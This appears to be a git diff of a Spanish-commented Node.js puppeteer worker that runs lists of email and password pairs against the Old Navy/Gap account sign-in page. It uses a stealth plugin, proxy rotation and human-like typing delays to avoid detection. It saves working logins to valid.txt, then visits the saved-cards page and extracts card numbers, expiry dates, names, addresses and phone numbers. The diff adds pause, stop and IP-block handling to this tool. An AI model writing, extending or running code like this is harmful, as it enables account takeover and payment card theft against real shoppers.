@@ -6,6 +6,7 @@ const fs = require('fs');
 puppeteer.use(StealthPlugin());
 
 let isPaused = false; // Variable para controlar la pausa
+let browser;
 
 // Función para manejar la pausa
 function checkPaused() {
@@ -20,29 +21,45 @@ function checkPaused() {
 }
 
 // Manejar mensajes desde el proceso principal
-parentPort.on('message', (message) => {
+parentPort.on('message', async (message) => {
     if (message === 'pause') {
         isPaused = true;
+        parentPort.postMessage('Worker pausado');
     } else if (message === 'resume') {
         isPaused = false;
+        parentPort.postMessage('Worker reanudado');
+    } else if (message === 'stop') {
+        console.log('Intentando detener el worker...');
+        if (browser) {
+            try {
+                await browser.close(); // Cierra el navegador
+                console.log('Navegador cerrado.');
+            } catch (error) {
+                console.error('Error al cerrar el navegador:', error);
+            }
+        }
+        process.exit(0); // Finalizar el proceso del worker
     }
 });
+
+
 
 async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNewProxy, humanizedMode) {
     let proxyIndex = 0;
     const results = [];
 
     for (let i = 0; i < credentials.length; i++) {
+        await checkPaused();
         const { email, password } = credentials[i];
         parentPort.postMessage(`Verificando: ${email}`);
 
         let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
         let { browser, page } = await createBrowserInstance(proxy);
 
-        try {
+        try {        
             await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', { waitUntil: 'domcontentloaded' });
             
-
+            await checkPaused();
             // Modo Humanizado
             const accessDenied = await page.evaluate(() => {
                 const h1Element = document.querySelector('h1');
@@ -59,6 +76,9 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
             // Introducción del correo electrónico
             await page.type('#verify-account-email', email, { delay: humanizedMode ? randomDelay(100, 400) : randomDelay(50, 150) });
             
+            
+            await checkPaused();
+
             // Modo Humanizado
 
             if (humanizedMode) {
@@ -83,24 +103,30 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
             // Clic en el botón de enviar
             // En modo humanizado, se puede añadir un pequeño retraso en el clic para simular un clic humano más lento
             await page.click('.loyalty-email-button', { delay: humanizedMode ? randomDelay(0, 0) : 0 });
-            
-        
+            await checkPaused();
+            await new Promise(resolve => setTimeout(resolve, randomDelay(1000, 1500)));
+
+            if (page.url().includes('errorCode=email_validation')) {
+                parentPort.postMessage('URL detectada: IP bloqueada.');
+                throw new Error('IP bloqueada');
+            }
+            await checkPaused();
 
             const navigationResult = await Promise.race([
                 page.waitForSelector('#create-account-first-name', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'register'),
                 page.waitForSelector('input[name="password"]', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'login'),
             ]);
-
+            await checkPaused();
             if (navigationResult === 'register') {
                 parentPort.postMessage('El correo no está registrado.');
                 await browser.close();
                 continue; // Ir al siguiente email en la lista
             }
-
+            await checkPaused();
             if (navigationResult === 'login') {
                 parentPort.postMessage('El correo ya está registrado.');
                 await page.type('input[name="password"]', password, { delay: humanizedMode ? randomDelay(100, 200) : randomDelay(50, 150) });
-
+                await checkPaused();
                 const signInButtonSelector = await page.$('.loyalty-signInForm-button') || await page.$('.loyalty-signInForm-button-with-legaltext');
 
                 if (signInButtonSelector) {
@@ -111,40 +137,40 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
                     continue; // Pasar al siguiente email
                 }
 
-              
+            await checkPaused();  
                
                 try {
                     const passwordError = await page.waitForFunction(
                         () => document.querySelector('.loyalty-signInForm-container')?.innerText.includes('Password not associated with this email address'),
                         { timeout: humanizedMode ? 10000 : 5000 }
                     ).catch(() => false);
-
+                    await checkPaused();    
                     if (passwordError) {
                         parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
                         await browser.close();
                         continue;
                     }
-
+                    await checkPaused();
                     await page.waitForSelector('.redesign-sidebar-nav-section-header-title', { timeout: humanizedMode ? 15000 : 10000 });
                     parentPort.postMessage('Inicio de sesión exitoso.');
 
                     fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);
-
+                    await checkPaused();
                     await page.goto('https://secure-oldnavy.gap.com/my-account/saved-cards', { waitUntil: 'domcontentloaded' });
                     parentPort.postMessage('Navegando a la sección de tarjetas guardadas...');
-
+                    await checkPaused();
                     await page.waitForSelector('.wallet-credit-card-edit', { timeout: humanizedMode ? 15000 : 10000 });
                     parentPort.postMessage('Tarjetas encontradas.');
-
+                    await checkPaused();
                     const cards = await page.$$('.wallet-credit-card-edit');
                     parentPort.postMessage(`Número de tarjetas encontradas: ${cards.length}`);
-
+                    await checkPaused();
                     for (const [index, card] of cards.entries()) {
                         parentPort.postMessage(`Procesando tarjeta ${index + 1}...`);
                         await page.evaluate(el => el.click(), card);
                         await page.waitForSelector('.add-payment-form', { timeout: humanizedMode ? 15000 : 10000 });
                         parentPort.postMessage(`Formulario de edición de la tarjeta ${index + 1} abierto.`);
-
+                        await checkPaused();
                         await new Promise(resolve => setTimeout(resolve, humanizedMode ? 5000 : 3000));
 
                         const formHTML = await page.evaluate(() => document.querySelector('.add-payment-form').innerHTML);
@@ -180,7 +206,7 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
                             saveValidData(email, password, cardData);
 
                             results.push({ email, password, cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber });
-
+                            await checkPaused(); 
                         } catch (error) {
                             parentPort.postMessage(`Error al extraer los datos de la tarjeta ${index + 1}: ${error.message}`);
                         }
@@ -190,7 +216,7 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
                             await page.evaluate(() => {
                                 document.querySelector('button[aria-label="close modal"]').click();
                             });
-
+                            await checkPaused();
                             await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));
 
                             parentPort.postMessage('Formulario cerrado exitosamente.');
@@ -234,8 +260,9 @@ async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNew
 
         await browser.close();
     }
-
+    
     fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
+    await checkPaused();
 }
 
 
